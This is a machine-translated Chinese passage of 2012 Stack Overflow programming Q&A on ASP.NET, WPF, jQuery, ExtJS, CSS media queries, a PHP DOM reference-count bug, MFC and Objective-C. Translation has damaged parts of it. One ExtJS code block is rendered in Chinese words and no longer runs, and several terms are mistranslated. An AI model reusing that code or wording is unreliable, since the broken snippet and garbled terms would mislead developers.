Asp.net mvc 3 在单声道上工作得很好（这不是将表创建为对象，wtf？！）。如果您提到 ORM 或活动记录，任何平台都有它们。.net 的唯一成本是 Windows 托管，其他一切都可以免费。如果你可以在 linux 服务器上运行 mono，你就解决了这个问题。

如果您的团队有使用 asp.net 的经验，为什么不继续利用它呢？经验丰富的开发人员很昂贵，而且 php 不像 c#。是的，php 很容易，编写蹩脚的代码也很容易，尤其是当您不熟悉该平台时。也许 php 开发人员比 .net 开发人员便宜，但我认为开发人员的价值不在于她所知道的编程语言。

至少就个人而言，我发现与 php 相比，使用 asp.net mvc 进行开发最容易。VS 是必备工具（没有任何 PHP IDE 与之匹配），C# 具有 php 梦寐以求的功能，.net mvc 是一个非常简单、优雅的框架。对我来说，尝试在 php 中做一些严肃的事情只是痛苦。我的工作效率至少下降了 50%，它只是在与泥浆搏斗。我从 php 开始，我已经用 php 编写了自己的 mvc 框架（谁还没有……）。

简单明了，如果您的团队是基于 .net 的，那么当您迁移到 php 时会很头疼。而且我有一种感觉，它们不会便宜。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T18:52:28.857

您应该考虑使用 Backbone.js+jQuery 作为前端 JS 库的 Ruby On Rails 堆栈。

我使用 KnockoutJS 已经有一段时间了，虽然我真的很喜欢 MVVM 模式，但如果不添加其他几个 JS 库，它并不适合大型前端项目。不过，我还没有尝试过 Backbone.js，所以请随意继续使用 Knockout。

在我公司使用的 Asp.net MVC 3 旁边，我想说 Rails 具有最广泛的支持和最完整的功能集。

如果可以，请远离 PHP：http: [//me.veekun.com/blog/2012/04/09/php-a-fractal-of-bad-design](http://me.veekun.com/blog/2012/04/09/php-a-fractal-of-bad-design)

我已经用 PHP 编程了好几年，但它与 Rails 或 Asp.net MVC 都比不上。

# image - 如何解决 VB6 中的运行时错误“429：Activex 组件无法创建对象”？

> ID：10246857
> 
> 赞同：2
> 
> 时间：2012-04-20T13:06:47.957
> 
> 标签：image, vb6, activex, runtime-error

我已经看到了很多关于此的问题，但仍然找不到我的代码的解决方案。我在调试时在VB6中遇到了这个问题..

```
Set img = New ImageFile
img.LoadFile mainform.picturePath & stock & ".jpg" 
```

好像我不能创建一个新的`ImageFile`并得到这个疯狂的错误报告。

我尝试了多个 dll 注册。

我还尝试将 DirectX 更新到 9.0c 并重新安装 vb6 - office components..

但仍然得到错误。我不知道是什么原因造成的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-25T12:44:37.610

我不确定您的参考在这里是否正确。ADO 没有 ImageFile 类型。

我认为您想要的是[Windows 图像采集自动化库](http://www.microsoft.com/download/en/details.aspx?id=18287)

安装后，您可以更新 VB 项目中的引用，并且应该能够正确创建 ImageType 的实例。

# wpf - ObservableCollection 和 INotifyPropertyChanged 有什么区别？

> ID：10246859
> 
> 赞同：7
> 
> 时间：2012-04-20T13:06:56.617
> 
> 标签：wpf, mvvm

我对如何`ObservableCollection`和`INotifyPropertyChanged`工作感到困惑。

我有这个代码：

```
Payments = new ObservableCollection<PaymentViewModel>(_allPayments);

public ObservableCollection<PaymentViewModel> Payments
{
    get { return _payments; }
    set {
        _payments = value;
        RaisePropertyChanged("Payments");
    }
} 
```

`ObservableCollection`我不明白和`INotifyPropertyChanged`这里有什么关系。你可以解释吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-20T13:19:10.860

`ObservableCollection`是一个专门的集合，可以在其*内容*更改时通知订阅者，而`INotifyPropertyChanged`它是一个接口，允许实现者在订阅者的某个*属性*更改值时通知订阅者。

您可能想知道这两者是如何相关的（因为在您的示例中，两者都“参与”了设置器）。

考虑这段代码：

```
var model = new MyViewModel(); // assume it's the class with Payments inside
model.Payments.Add(new PaymentViewModel()); 
```

事件的订阅者[`INotifyCollectionChanged.CollectionChanged`](http://msdn.microsoft.com/en-us/library/system.collections.specialized.inotifycollectionchanged.collectionchanged.aspx)现在会知道事情发生了变化，他们应该相应地更新。

但现在看看这个：

```
var model = new MyViewModel(); // assume it's the class with Payments inside
model.Payments.Add(new PaymentViewModel()); // OK, we know what this does

model.Payments = new ObservableCollection<PaymentViewModel>(); 
```

将一个项目添加到集合后，我们*将整个集合换成另一个*。如果 an`ItemsControl`绑定到这个集合，我们希望它能够自我更新并反映`model.Payments`最终为空的事实。但它怎么能做到呢？

`CollectionChanged`将无济于事，因为原始集合（在收到第一个项目后）没有被修改；我们只是将其丢弃并在其位置安装了另一个。唯一知道切换发生的是`Payments`属性设置器。所以 setter`INotifyPropertyChanged`用来告诉订阅者该集合已被另一个替换，他们当然应该更新他们的状态。

**结论：**数据绑定在 WPF 中自动工作，因为所有数据绑定控件都侦听`INotifyPropertyChanged`它们的`DataContext`，*并且*如果绑定目标实现`INotifyCollectionChanged`它们也会订阅它。如果绑定目标发生更改，则通过 通知他们`INotifyPropertyChanged`，从`INotifyCollectionChanged`旧目标上取消订阅并在新目标上订阅它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T13:14:00.020

一个 ObservableCollection 通知它的活页夹，例如当某些东西被添加/删除到集合本身时。

但是，您在第二个示例中所做的是通知活页夹该集合已被新集合替换（如果您执行新的 ObservableCollection，则 ObservableCollection 不会自行执行此操作-您会丢失绑定）。

# javascript - 使用 jQuery 在可能的属性值中进行选择

> ID：10246860
> 
> 赞同：0
> 
> 时间：2012-04-20T13:07:00.607
> 
> 标签：javascript, jquery

是否可以像这样使用 jQuery 选择项目：

```
// pseudocode
$('input[name=val1 or val2 or val3...]') 
```

现在我正在尝试做下一个：

```
$("input[name='A'] input[name='B'] input[name='C']").blur(function() {
    var result = parseFloat($("input[name='A']").val()) +
        parseFloat($("input[name='B']").val()) -
        parseFloat($("input[name='C']").val());

    alert(result.toFixed(2));
}); 
```

但这不起作用。它仅适用于选择器中的一项`$("input[name='A'])`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:09:05.323

有很多方法可以做到这一点，这里有一个例子：

`$('input[name="A"], input[name="B"], input[name="C"]')`

对于所有这些，请查看[多个属性选择器](http://api.jquery.com/category/selectors/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:08:57.493

尝试

```
$("input[name='A'],input[name='B'],input[name='C']") 
```

安装的

```
$("input[name='A'] input[name='B'] input[name='C']") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T13:09:20.067

据我所知，您必须明确指定选项：

```
$('input[name="val1"], input[name="val2"], input[name="val3"]') 
```

如果名称具有相同的格式（并以`val`字符串开头），您可以：

```
$('input[name^="val"]'); 
```

或者，但这与第一种方法更不相等，尽管它看起来效率较低（并且可能是）：

```
$('input[name]').filter(
    function(){
        return (this.name.indexOf('val') > -1);
    }); 
```

有点令人惊讶的是，在 Chrome 18/Win XP 上，第二个选项 ( `$('input[name^="val"]');`) 是最快的（尽管它的实现可能更容易依赖`document.querySelectorAll()`。最后的方法，`.filter()`如预期的那样，是最慢的。

[JS Perf 测试用例](http://jsperf.com/testing-input-selection-by-name-value)。

顺便说一句，虽然我最初错过了语法错误，但缺少逗号来分隔选择器意味着您原来的、不工作的代码正在寻找 an 的子元素`input`，这将是无效的标记。

使用逗号来标识单独的元素选择器。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T13:10:04.903

为什么不给他们所有相同的类，然后像这样选择它们

`$('.selectedInputs')`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-20T13:40:20.183

关于参考（特别是下面的评论）[http://api.jquery.com/multiple-attribute-selector/](http://api.jquery.com/multiple-attribute-selector/)可以考虑替代解决方案：

```
$('input[name=A][name=B]') 
```

凉爽的！

# jquery - 如何在 jquery selectmenu 插件中隐藏选项

> ID：10246867
> 
> 赞同：0
> 
> 时间：2012-04-20T13:07:43.527
> 
> 标签：jquery, jquery-ui, jquery-plugins

当我尝试同时`$('option').hide()`使用 selectmenu jquery 插件从 select() 中删除或隐藏一个选项时，它仍然会显示我想要删除的那些选项。销毁选择菜单后，我将看到通常的 html 下拉选择，并且已删除选项。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T14:28:29.733

假设您想更改或删除一个选项。

您可以尝试使用演示页面 [http://jquery-ui.googlecode.com/svn/branches/labs/selectmenu/index.html](http://jquery-ui.googlecode.com/svn/branches/labs/selectmenu/index.html) 通过 Firebug 控制台或任何类似的：

```
$("select#speedC").find("option:first").remove();
//and then you can refresh with 
$("select#speedC") 
.selectmenu("destroy") //destroy the custom select menu 
.selectmenu({style:'dropdown'}); //replace with the new custom select menu 
```

这不是最好的选择，但刷新似乎不起作用。

让我知道。多纳托。

# java - 从 Java 检测 AIR 和 Flash 版本

> ID：10246875
> 
> 赞同：0
> 
> 时间：2012-04-20T13:08:06.113
> 
> 标签：java, flash, air, adobe

我需要从 Windows 上的 Java 应用程序中检测已安装的 Adob​​e AIR 和 Flash 的版本。

一种方法是读取**“C:\Program Files (x86)\Common Files\Adobe AIR\Versions\1.0”**文件夹中的 .exe 文件的元数据，但这显然是一个丑陋的解决方案。对于 Flash 版本，可以尝试读取注册表项**HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\FlashPlayerPlugin\ /v Version**，但我不确定名称的 *Plugin 部分是否是一个很好的指标，因为我需要 Flash 版本，即实际上由 AIR 使用，而不是由浏览器使用。

有什么干净的方法可以完成这项工作吗？

# ruby-on-rails-3 - How to fetch the last child record group by parent ID with matched conditions

> ID：10246882
> 
> 赞同：1
> 
> 时间：2012-04-20T13:08:30.970
> 
> 标签：ruby-on-rails-3, gem, meta-search

I am using meta_search gem in my projects and have users and user_details tables.

users table should have unchangeable informations such as name, sex, blood group, date of birth..etc

user_details have address, mobile number...etc

user.rb

```
has_many :user_details 
```

user_detail.rb

```
belongs_to :user 
```

I am treating every updated user_details record as new record. I am currently displaying the last record of user_details as user's current record

user_details table looks like

```
id name       gender   phone        user_id
1\. xxx        m        99389989     1
2  xxx        f        3344444      1
3  xxx        m        323434       1
4  xxx yy     f        3324324      2
5  xxx yyy    f        332423       2 
```

**Question**: When I am searching with key word, How to fetch the last user_details record for every user with matched conditions.

**Example**: if I search name_starts_with 'xxx' then it is fetching the ID 1 to 5\. But I want to fetch only ID 3 and 5

Thanks in Advance

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T14:45:20.430

Finally I have fixed using mysql's MAX method

```
scope :last_record_in_each_group, lambda { |name|
  cond = "user_details.id in (select max(user_details.id) from user_details group by user_details.user_id)"
  cond << " and upper((CONCAT(first_name,' ', middle_name,' ', last_name))) like ?"
  {:conditions => [cond, "%#{name.upcase}%"]}
} 
```

In view

```
<%= search.text_field :last_record_in_each_group, :placeholder => "User Name" %> 
```

# vba - VBA 为什么我必须将类变量调暗为变体，而不是其类型？

> ID：10246893
> 
> 赞同：2
> 
> 时间：2012-04-20T13:09:01.067
> 
> 标签：vba, excel

在 Excel 宏中，我定义了一个函数，像这样返回一个 Recordset

```
Function GetCommissionDataRecordset(doctorCode As String) As ADODB.Recordset
    Set GetCommissionDataRecordset = New ADODB.Recordset
    .
    . ' setup the connection and SQL string...
    .
    GetCommissionDataRecordset.Open strSQL
end function 
```

我尝试像这样调用函数

```
sub tester()
    'Dim oRecSet As ADODB.Recordset  ' this doesn't work, needs to be a variant
    Dim oRecSet As Variant
    Set oRecSet = GetCommissionDataRecordset("GC")
    'Copy Data to Excel'

    ActiveSheet.Range("a1").CopyFromRecordset (oRecSet)
end sub 
```

如果在`tester`我定义的子过程中`oRecSet as ADODB.Recordset`，我在执行`CopyFromRecordset`.

当我定义`oRecSet`为`Variant`.

运行时错误是`430 Class does not support Automation or does not support expected interface`.

发生错误时，Watch 告诉我的类型`oRecSet`是`Recordset/Recordset`

当我使用变体方法时，Watch 告诉我的类型`oRecSet`是`Variant/Object/Recordset`

在 Watch 中检查对象的属性对我来说似乎没有什么不同。

这是怎么回事？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T13:27:54.877

CopyFromRecordSet 需要一个 Variant 参数。当您（不小心？）按值发送记录集时，由于 oRecSet 周围的 ()，类型匹配似乎非常严格，从而导致错误。

如果您将呼叫更改为：

```
ActiveSheet.Range("a1").CopyFromRecordset oRecSet 
```

当 oRecSet 是 RecordSet 时它会起作用，但是您不会强制传递按值参数。实际上，函数声明没有指定参数是 ByVal 还是 ByRef，但人们不会期望“**从**记录集复制”方法来更改其内容。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T13:26:51.193

你不必，你只需要删除括号

```
ActiveSheet.Range("a1").CopyFromRecordset oRecSet 
```

# programming-languages - 学习许多不同的编程语言不好吗？

> ID：10246897
> 
> 赞同：1
> 
> 时间：2012-04-20T13:09:06.500
> 
> 标签：programming-languages

如果有人要求您编写有关某事的程序，您是否可以在不查看参考资料的情况下使用您知道的任何语言来编写程序？

你能记住所有语言的特性吗，因为有些语言不可能有其他语言可能有的特性？例如，C++ 可以继承两个类，而在 Java 中则不能（接口可以）。如果它不是静态常量，你也不能在 C++ 中初始化一个实例变量......在 Java 中你可以。

我问这个是因为在我可以用 Visual Basic 编程之前，但现在我正在学习 Java，事情发生了变化——就像实例化对象的语法一样简单，我感到困惑。我需要查看 Visual Basic 参考才能做到这一点。

学习许多不同的编程语言不好吗？因为我觉得我在浪费时间学习 Visual Basic。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T13:15:03.153

我相信这取决于个人，但我猜对大多数人来说，学习不止一种语言是一件好事——就像访问其他国家和尝试新食物是一件好事一样：它拓宽了视野或许还有过程中的变化和挑战。

当有像[七周内七种语言](http://pragprog.com/book/btlang/seven-languages-in-seven-weeks)这样的编程书籍时，我认为可以相当肯定地说，软件多语言通常被认为是好的，而不是坏的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T13:29:29.543

学习不同的编程语言*范式*很重要也很有用：与 OOP 相比，函数式编程风格是一种非常不同的解决问题的方式。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-20T13:16:31.063

我主要是 C# 程序员，但我也知道 VB、Perl、C++、PHP 和一点 java。如果我有问题，我通常可以在 C# 和 VB 中解决它，而无需查看引用（当然取决于它的复杂性）。我也可以用其他语言来做，但经常我必须检查语言文档（即使我已经做了 1000 次）。

我不认为这很糟糕。恰恰相反——这很好。但请记住，你永远不会擅长所有这些。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-20T13:34:02.923

学习多种不同的口语不好吗？这两个问题的答案都是否定的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-20T13:38:52.027

我不认为学习许多不同的编程语言是坏事。

您似乎遇到的问题是您正在学习两种相似的语言：Java 和 VB。当一个人学习常见的（不是编程的）口语时，就会出现这个问题。同时学习意大利语和西班牙语并不好，因为这两种语言存在差异，但在许多方面都非常相似，以至于大脑会感到困惑，并将一种语言的概念/结构/语法/单词与另一种语言联系起来。

# javascript - ExtJS v4.0 - 带有自定义纯色条的条形图

> ID：10246898
> 
> 赞同：1
> 
> 时间：2012-04-20T13:09:12.170
> 
> 标签：javascript, extjs, extjs4

我在用#006AB8 纯色为ExtJS 中的条形图着色时遇到问题。

通过查看文档，我得到了某种工作，没有颜色。

这是我的系列的代码：

```
 series: [{
            type: 'bar',
            axis: 'bottom',
            highlight: true,
            tips: {
              trackMouse: true,
              width: 140,
              height: 28,
              renderer: function(storeItem, item) {
                this.setTitle(storeItem.get('callcentre') + ': ' + storeItem.get('calls'));
              }
            },
            label: {
              display: 'insideEnd',
                field: 'calls',
                renderer: Ext.util.Format.numberRenderer('0'),
                orientation: 'horizontal',
                color: '#333',
              'text-anchor': 'middle'
            },
            xField: 'callcentre',
            yField: ['calls'],
            renderer: function() {
                    return Ext.apply({
                            fill: '#006AB8'
                    });
            }
        }] 
```

渲染器坏了，我无法正确格式化它。

谢谢，

卢克。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T07:08:13.523

我是这样做的。

```
renderer: function(sprite, record, attr, index, store) {
    var value = 0;
    var color = ['rgb(147, 169, 208)'][value];
    return Ext.apply(attr, {
        fill: color
    });
} 
```

如果你想有更多的颜色选择，只需这样做：

```
var value = 3; <-- the value determines the color array (index starts 0).
var color = [
    'rgb(114, 19, 15)', 
    'rgb(92, 48, 71)', 
    'rgb(81, 114, 179)', 
    'rgb(196, 185, 183)', 
    'rgb(13, 111, 62)',
    'rgb(158, 129, 133)',
    'rgb(50, 107, 126)'][value];
    return Ext.apply(attr, {
    fill: color
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-23T19:31:55.990

你可以试试这段代码：

```
    渲染器：函数（精灵，记录，属性，索引，存储）{
        返回 Ext.apply(attr, {
            填充：'#006AB8'
        });
    }

```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-25T14:23:56.187

我希望我能帮上忙

我像这样给我的酒吧上色：

```
var colors = ['rgb(255, 255, 0)',
                  'rgb(125, 255, 0)',
                  'rgb(0, 255, 0)',
                  'rgb(0, 255, 125)',
                  'rgb(0, 0, 255)'];

Ext.chart.theme.Browser = Ext.extend(Ext.chart.theme.Base, {
    constructor: function (config) {
        Ext.chart.theme.Base.prototype.constructor.call(this, Ext.apply({
            colors: colors
        }, config));
    }
}); 
```

在此之后，您将主题“浏览器：渐变”作为属性传递给您的图表：

```
var chart = Ext.create('Ext.chart.Chart', {
    width: 500,
    height: 200,
    theme: 'Browser:gradients',
    ...}); 
```

# html - CSS3 媒体查询 - 在某些浏览器中不起作用（官方支持 MQ）

> ID：10246903
> 
> 赞同：1
> 
> 时间：2012-04-20T13:09:20.707
> 
> 标签：html, css, media-queries, responsive-design

请告诉我 - 我在哪里犯了错误以及为什么页面在没有媒体查询的情况下显示在 Opera mini 中？

**jsfiddle** - [http://jsfiddle.net/vhCLs/](http://jsfiddle.net/vhCLs/)

或者

cssdesk - [http://cssdesk.com/fPS2s](http://cssdesk.com/fPS2s)

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title></title>
</head>
<body>
<style type="text/css">
    .gogogo{height:50px;width:100%;}
    @media screen and (min-width:100px){
        .gogogo {background-color:red;}
    }
    @media screen and (min-width:320px){
        .gogogo {background-color:orangered;}
    }
    @media screen and (min-width:480px){
        .gogogo {background-color:orange;}
    }
    @media screen and (min-width:600px){
        .gogogo {background-color:yellowgreen;}
    }
    @media screen and (min-width:768px){
        .gogogo {background-color:green;}
    }
</style>
<div class="gogogo"></div>
</body>
</html> 
```

它是如何工作的 - 拉动屏幕宽度，你会注意到块的反应（它会改变颜色）

**UPD：** 我找到了一个跨浏览器的解决方案，当然还很不理想，并没有完全覆盖整个动物园的老浏览器……</p>

```
 <!--[if lt IE 9]>
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <!--[if lt IE 9]>
        <script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
    <![endif]-->
    <meta name="viewport" content="width=device-width; initial-scale=1.0"> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T15:39:35.793

[Opera Mini](http://www.opera.com/mobile/help/faq/)是一个[代理浏览器](https://stackoverflow.com/q/10222172/770127)——它的工作方式与普通浏览器不同。初始 JavaScript 将运行，但绑定到调整大小事件的函数不会运行，因为页面在代理上呈现并以某种静态位图发送到手机。它并不意味着是交互式的——它只是意味着快速。许多较低级别的功能手机使用 Opera Mini 作为浏览器。如果您有 iPhone，您可以访问[Opera 网站](http://www.opera.com/mobile/)并为 iPhone 安装 Opera Mini 以进行测试。我还注意到在 iPhone 上运行 Opera Mini，根据这个[测试页面](http://responsejs.com/labs/dimensions/)，视口高度并不准确。您可能需要从外部文件加载 CSS 以使[css3-mediaqueries-js](http://code.google.com/p/css3-mediaqueries-js/)工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-23T06:20:46.403

使用[Modernizr](http://modernizr.com)进行特征检测。Opera Mini 5-7 和 IE 8+ 是唯一支持媒体查询的版本。因此，Modernizr 通过 JavaScript 驱动的特征检测让您更好地控制体验。

# php - foo(array(...)) 和 foo($x=array(...)) 有什么区别？

> ID：10246904
> 
> 赞同：1
> 
> 时间：2012-04-20T13:09:28.147
> 
> 标签：php

看这个例子：

这个类扩展了 DOMElement。每个 DOMElement 都必须是任何 DOMDocuement 的一部分才能进行修改。

```
class Xmlrize  extends DOMElement
{
    private static $dom;

    public function __construct(/*. string .*/ $name,$value =null) {
        parent::__construct($name,$value,null);
    if(!self::$dom) {
            self::$dom = new DOMDocument('1.0','UTF-8');
        }
        self::$dom->appendChild($this);
    }
} 
```

用于将数组添加到 DOM 中。如果数组的值不是 Xmlrize，那么我忽略它。

```
class Attributes extends Xmlrize {

    public function __construct(array $attributes)
    {
        parent::__construct('Attributes');

        foreach($attributes as $name => $value) {
            $element = new Xmlrize($name);
            if($value instanceof Xmlrize)
                $element->appendChild($value);
            $this->appendChild($element);
        }
    }
} 
```

您可以在构造函数中添加属性实例

```
class Html extends Xmlrize {

    public function __construct(Attributes $obj) {
        parent::__construct('html');
        $this->addAttributes($obj);
    } 
```

此方法显示属性是否是 Xmlrize 的实例。

```
 protected function addAttributes(Attributes $attributes)
    {
        foreach($attributes->childNodes as $attribut) {
           if($attribut->childNodes->length == 1) {
                $item = $attribut->childNodes->item(0);
            echo $attribut->nodeName.': ';
            echo $item->nodeName.' has value '.$item->nodeValue.'. ';
            echo 'Is it DomElement? ';
            echo ($item instanceof DomElement) ? 'true' : 'false';
            echo '. Is it Xmlrize? ';
            echo ($item instanceof Xmlrize) ? 'true' : 'false';
            echo '.'.PHP_EOL;
           }
        }
        return null;
    }
} 
```

通过数组启动属性的示例。看看差异！

```
/* works as expected */
$like = new Html(new Attributes(
            $xx =  array('XXX'=> new Xmlrize('foo', 'baar'))
));

/* do not work as exptected */
$like = new Html(new Attributes(
              array('XXX'=> new Xmlrize('foo', 'baar'))
));
?> 
```

上面的示例返回：

```
XXX: foo has value baar. Is it DomElement? true. Is it Xmlrize? true.
XXX: foo has value baar. Is it DomElement? true. Is it Xmlrize? false. 
```

为什么如果我添加 '$xx =' 该元素被视为 Xmlrize，如果不是，则不是？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T15:32:03.583

恭喜，您在 PHP 的 DOM 实现中发现了一个错误。我花了一些时间处理您的代码，并且能够将错误行为缩小到这个简单的测试用例：

```
class MyElement extends DOMElement { }

// #1 - okay
$dom = new DOMDocument();
$e = new MyElement("e");
$dom->appendChild($e);
echo get_class($dom->childNodes->item(0)) . "\n";

// #2 - wrong
$dom = new DOMDocument();
$dom->appendChild(new MyElement("e"));
echo get_class($dom->childNodes->item(0)) . "\n";

// #3 - wrong
$dom = new DOMDocument();
$e = new MyElement("e");
$dom->appendChild($e);
$e = null;
echo get_class($dom->childNodes->item(0)) . "\n"; 
```

这显然是 PHP 中的一个错误，但这就是发生这种情况的原因。PHP 中的每个对象都有一个引用计数（在任何地方都有多少对该对象的引用）。当您调用 时`$dom->appendChild(...)`，此函数应在内部增加对象的引用计数，但事实并非如此。当您运行示例 #1 时，一切似乎都很好，但在示例 #2 中，对象是“临时”创建的（仅用于调用），引用计数为 1。`appendChild`完成后，PHP 将引用计数减少到 0，因此删除内存中的对象。

现在到了棘手的部分：您现在应该想“哇，这意味着有一些指向已释放（死）内存的指针，程序应该严重崩溃”。但这不仅仅是因为 PHP 的内存管理器并没有真正释放未使用的内存，它只是将其标记为已释放。因此，您仍然可以例如从中读取，尽管内存的内容可能已经被另一个分配改变了。这就是真正发生的事情。我用调试器检查了对象真的被释放了（显然不应该，它应该有来自 DOM 层次结构的引用）。

现在你应该做的是 1) 向 PHP 的网站提交错误报告 2) 要么停止使用 DOMElement 类，要么确保你“附加”到 DOM 层次结构的每个对象也是在其他地方引用。

另外，如果尚不清楚，这就是为什么您在`foo(array(...))`and之间遇到不同行为的原因`foo($x = array(...))`：第二个将数组分配给全局（或本地，取决于您调用它的位置）变量，该变量将保存数组和数组，有对您的对象的引用。因此不会被释放，并且 DOM 中的层次结构是可以的。

让我知道您是否要提交错误报告。如果你愿意，我会这样做，但是，这是你的错误 :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:35:43.603

`foo(array(…))`和之间的唯一区别`foo($x=array(…))`是：

`foo(array(…))`仅将数组作为参数传递给 foo 方法。

`foo($x=array(…))`将数组保存到 $x 变量并将相同的变量 $x 传递给 foo 方法。

# c++ - winapi - 我应该重写 CButton 还是 CWnd 来创建自定义控件？

> ID：10246907
> 
> 赞同：0
> 
> 时间：2012-04-20T13:09:42.157
> 
> 标签：c++, windows

我知道 CButton、CEdit 等都是易于实现的方便类，但是要覆盖它们并停止某些超类函数来实现自己的按钮功能，有点麻烦。重写 CWnd 并从头开始不是更实用吗？这更像是一个基于主体的问题，即像这样从头开始是不好的做法吗？在我看来，这更有意义，但我不想拥有被认为写得不好的代码..？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:16:05.197

很难获得标准控件的所有细微差别，因此如果期望您的角色扮演相同的角色，您可能应该从标准开始。

标准控件也可以放置在对话框中并在以后覆盖。需要显式创建一个普通的 CWnd。

另一方面，重写微软设计控件的方式有时会让人抓狂。

不幸的是，这最终是一个判断电话。每个案例都会有所不同，不可能一概而论。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:16:24.760

你可以这样做，但是如果你的自定义控件是一个按钮，那么继承 CButton 会容易得多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T13:19:00.967

好吧，最好从 CButton 类开始增强按钮，从 CEdit 类开始增强编辑控件。这样您就不必重新编写控件的基本功能和控件通知消息。

就 UI 而言，与 CWnd 相比，您可以平等地控制在 CButton 中覆盖 UI。所以最好增强CButton。

此外，请记住 CButton 可以是单选按钮、复选框等。使用普通的 CWnd 获得所有这些将意味着大量工作。

# database - 使用 UniDAC 创建新数据库

> ID：10246915
> 
> 赞同：0
> 
> 时间：2012-04-20T13:10:14.233
> 
> 标签：database, delphi, unidac

我一直在努力使用允许用户为我的应用程序创建新数据库的功能它必须是通用功能，因为有些使用 MS Access，有些使用 SQLite，有些使用 MySQL

我花了几个小时查看提供的演示，但没有找到任何对我有用的东西

我想要做的是根据以下参数创建一个新的数据库：提供者、服务器、端口、用户、密码、数据库名称（或文件名）

我有以下用于创建 MS Access 的功能，但它并不能解决问题。

```
Calling it by   SQLConfigDataSource(0, 1, 'Microsoft Access Driver (*.mdb)','CREATE_DB="' + DatabaseName + '"')

Function SQLConfigDataSource(hwndParent: Integer; fRequest: Integer;
  lpszDriverString: string; lpszAttributes: string): Integer; stdcall;
var
  func : TSQLConfigDataSource;
  ODBCHModule: HMODULE;
begin
  ODBCHModule := LoadLibrary('odbccp32.dll');
  if ODBCHModule = 0 then
    raise Exception.Create(SysErrorMessage(GetLastError));
  func :=  GetProcAddress(ODBCHModule,PChar('SQLConfigDataSource'));
  if @func = nil then
    raise Exception.Create('Error Getting adress for SQLConfigDataSource' + SysErrorMessage(GetLastError));

  Result := func(hwndParent, fRequest, lpszDriverString, lpszAttributes);
  FreeLibrary(ODBCHModule);
end; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-21T05:55:14.107

1.  SQLite - just open a database. If it does not exist then it will be created.
2.  MySQL - you need to connect with a server. Then execute `CREATE DATABASE <name>` command.
3.  Microsoft Access - this depends on the components you are using. I does not know about UniDAC. But using ODBC execute `SQLConfigDataSource(0, ODBC_ADD_DSN, '<driver name>', 'CREATE_DB=<db path>')`.

# iphone - 客观C/Iphone开发中Perform Selector有什么用

> ID：10246923
> 
> 赞同：3
> 
> 时间：2012-04-20T13:10:44.280
> 
> 标签：iphone, objective-c, ios, cocoa-touch, performselector

在目标 C 中执行选择器有什么用？你能告诉我执行选择器和响应选择器之间的区别吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:28:00.200

**-respondsToSelector：**允许您测试某个对象是否响应给定的选择器，如果您仍然向它发送消息，您的应用程序是否会崩溃。

* * *

**-performSelector:(withObject:)**只是调用某个方法，例如

```
[object performSelector:@selector(retain)]; 
```

将等于

```
[object retain]; 
```

* * *

你为什么需要那个？提供了一个方便的示例`NSArray`：它允许选择器由它包含的所有对象执行，例如

```
[self.subviews makeObjectsPerformSelector:@selector(removeFromSuperview)]; 
```

将等于

```
for (UIView *view in self.subviews)
{
    [view removeFromSuperview];
} 
```

而这`-makeObjectsPerformSelector:`是更优雅的方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:13:00.830

**respondsToSelector：**返回一个布尔值，指示接收者是否实现或继承了可以响应指定消息的方法。

**performSelector：**向接收者发送指定的消息，并返回消息的结果。

PerformSelector 用于调用您想要执行的方法，这意味着您可以选择不同的选项来执行特定的任务（方法）示例...

– performSelector:withObject:afterDelay: // 将在特定延迟后执行方法.. – performSelector:withObject:afterDelay:inModes: – performSelectorOnMainThread:withObject:waitUntilDone: – performSelectorOnMainThread:withObject:waitUntilDone:modes: – performSelector:onThread:withObject:waitUntilDone : – performSelector:onThread:withObject:waitUntilDone:modes:

– performSelectorInBackground:withObject: // 在后台执行任务。所以，你的 ManinThread(Application) 不会停止响应......就像多线程一样......

直接方法不会提供执行任务的选择。

[有关更多详细说明，请访问此参考。](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsobject_Class/Reference/Reference.html)

希望对你有帮助...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T13:36:02.777

performSelector 的典型用法是在您不知道这样做是否有效时向对象发送消息。

